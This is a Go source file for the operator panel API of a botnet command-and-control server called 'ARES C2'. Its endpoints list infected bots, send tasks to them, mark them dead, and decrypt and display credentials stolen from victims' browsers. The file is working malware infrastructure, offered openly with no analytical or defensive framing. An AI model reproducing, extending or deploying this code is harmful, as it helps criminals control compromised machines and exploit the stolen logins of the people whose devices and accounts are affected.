/*
 * ARES C2 — Panel API Handler (v5.0 Overhaul)
 *
 * Handles all operator-facing endpoints:
 *   GET  /api/panel/bots     — List all bots
 *   GET  /api/panel/bot/:id  — Get single bot
 *   POST /api/panel/task     — Send task to bot
 *   GET  /api/panel/data/:id — Get stolen data for bot
 *   GET  /api/panel/stats    — Dashboard statistics
 *   GET  /api/panel/audit    — Audit log
 *   POST /api/panel/kill     — Kill bot
 *   POST /api/panel/kill-all — Kill all bots
 *   GET  /health             — Health check
 *
 * All responses are JSON. Frontend is React SPA (separate process).
 */

package api

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"

	"ares-c2/internal/crypto"
	"ares-c2/internal/database"
	"ares-c2/internal/queue"
)

type PanelHandler struct {
	db        *database.DB
	publisher *queue.Publisher
	masterKey *crypto.MasterKey
}

func NewPanelHandler(db *database.DB, pub *queue.Publisher, mk *crypto.MasterKey) *PanelHandler {
	return &PanelHandler{
		db:        db,
		publisher: pub,
		masterKey: mk,
	}
}

// RegisterRoutes registers all panel API routes (all require auth middleware)
func (h *PanelHandler) RegisterRoutes(mux *http.ServeMux, authMiddleware func(http.HandlerFunc) http.HandlerFunc) {
	mux.HandleFunc("GET /api/panel/bots", authMiddleware(h.handleListBots))
	mux.HandleFunc("GET /api/panel/bot/{id}", authMiddleware(h.handleGetBot))
	mux.HandleFunc("POST /api/panel/task", authMiddleware(h.handleSendTask))
	mux.HandleFunc("GET /api/panel/data/{id}", authMiddleware(h.handleGetData))
	mux.HandleFunc("GET /api/panel/stats", authMiddleware(h.handleStats))
	mux.HandleFunc("GET /api/panel/audit", authMiddleware(h.handleAuditLog))
	mux.HandleFunc("POST /api/panel/kill", authMiddleware(h.handleKillBot))
	mux.HandleFunc("POST /api/panel/kill-all", authMiddleware(h.handleKillAll))
	mux.HandleFunc("GET /health", h.handleHealth)
}

// ── List Bots ──

func (h *PanelHandler) handleListBots(w http.ResponseWriter, r *http.Request) {
	bots, err := h.db.ListBots()
	if err != nil {
		http.Error(w, "database error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"bots":  bots,
		"count": len(bots),
	})
}

// ── Get Single Bot ──

func (h *PanelHandler) handleGetBot(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if !isValidBotID(id) {
		http.Error(w, "invalid bot id", http.StatusBadRequest)
		return
	}
	bot, err := h.db.GetBot(id)
	if err != nil || bot == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(bot)
}

// ── Send Task ──

func (h *PanelHandler) handleSendTask(w http.ResponseWriter, r *http.Request) {
	var req struct {
		BotID string          `json:"bot_id"`
		Type  int             `json:"type"`
		Args  json.RawMessage `json:"args"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}
	if !isValidBotID(req.BotID) {
		http.Error(w, "invalid bot id", http.StatusBadRequest)
		return
	}

	taskID := fmt.Sprintf("task_%d_%s", time.Now().UnixNano(), req.BotID[:8])
	argsStr := "[]"
	if req.Args != nil {
		argsStr = string(req.Args)
	}

	if err := h.db.CreateTask(taskID, req.BotID, req.Type, argsStr); err != nil {
		log.Printf("[PANEL] Create task error: %v", err)
		http.Error(w, "database error", http.StatusInternalServerError)
		return
	}

	// Audit log
	operator := r.Header.Get("X-Operator")
	h.db.AuditLog(operator, "send_task", fmt.Sprintf("bot=%s type=%d", req.BotID[:8], req.Type), extractIP(r))

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"task_id": taskID,
		"status":  "queued",
	})
}

// ── Get Stolen Data ──

func (h *PanelHandler) handleGetData(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	if !isValidBotID(id) {
		http.Error(w, "invalid bot id", http.StatusBadRequest)
		return
	}

	creds, err := h.db.GetCredentials(id)
	if err != nil {
		http.Error(w, "database error", http.StatusInternalServerError)
		return
	}

	// Decrypt credentials for display
	type decryptedCred struct {
		ID       int       `json:"id"`
		Type     string    `json:"type"`
		Browser  string    `json:"browser"`
		URL      string    `json:"url"`
		Username string    `json:"username"`
		Data     string    `json:"data"`
		Created  time.Time `json:"created_at"`
	}

	var result []decryptedCred
	for _, c := range creds {
		dc := decryptedCred{
			ID:       c.ID,
			Type:     c.Type,
			Browser:  c.Browser,
			URL:      c.URL,
			Username: c.Username,
			Created:  c.CreatedAt,
		}
		if c.DataEnc != nil {
			if plaintext, err := h.masterKey.Decrypt(c.DataEnc, id); err == nil {
				dc.Data = string(plaintext)
			} else {
				dc.Data = "[DECRYPT_ERROR]"
			}
		}
		result = append(result, dc)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"credentials": result,
		"count":       len(result),
	})
}

// ── Dashboard Stats ──

func (h *PanelHandler) handleStats(w http.ResponseWriter, r *http.Request) {
	total, active, sleeping, dead := h.db.CountBots()
	credCount := h.db.CountCredentials()
	queueLen := h.publisher.QueueLength()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"bots": map[string]int{
			"total":    total,
			"active":   active,
			"sleeping": sleeping,
			"dead":     dead,
		},
		"credentials":  credCount,
		"queue_length": queueLen,
	})
}

// ── Audit Log ──

func (h *PanelHandler) handleAuditLog(w http.ResponseWriter, r *http.Request) {
	entries, err := h.db.GetAuditLog(100)
	if err != nil {
		http.Error(w, "database error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"entries": entries,
		"count":   len(entries),
	})
}

// ── Kill Bot ──

func (h *PanelHandler) handleKillBot(w http.ResponseWriter, r *http.Request) {
	var req struct {
		BotID string `json:"bot_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}
	if !isValidBotID(req.BotID) {
		http.Error(w, "invalid bot id", http.StatusBadRequest)
		return
	}

	h.db.UpdateBotStatus(req.BotID, "dead")

	operator := r.Header.Get("X-Operator")
	h.db.AuditLog(operator, "kill_bot", req.BotID[:8], extractIP(r))

	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"status": "killed"})
}

// ── Kill All ──

func (h *PanelHandler) handleKillAll(w http.ResponseWriter, r *http.Request) {
	bots, _ := h.db.ListBots()
	count := 0
	for _, bot := range bots {
		if bot.Status != "dead" {
			h.db.UpdateBotStatus(bot.ID, "dead")
			count++
		}
	}

	operator := r.Header.Get("X-Operator")
	h.db.AuditLog(operator, "kill_all", fmt.Sprintf("killed %d bots", count), extractIP(r))

	json.NewEncoder(w).Encode(map[string]interface{}{
		"status": "all killed",
		"count":  count,
	})
}

// ── Health Check ──

func (h *PanelHandler) handleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"status": "ok",
		"time":   time.Now().Format(time.RFC3339),
	})
}

// ── Validation ──

func isValidBotID(id string) bool {
	if len(id) < 8 || len(id) > 64 {
		return false
	}
	for _, c := range id {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			return false
		}
	}
	return true
}

// Prevent unused import warnings
var _ = strings.TrimSpace
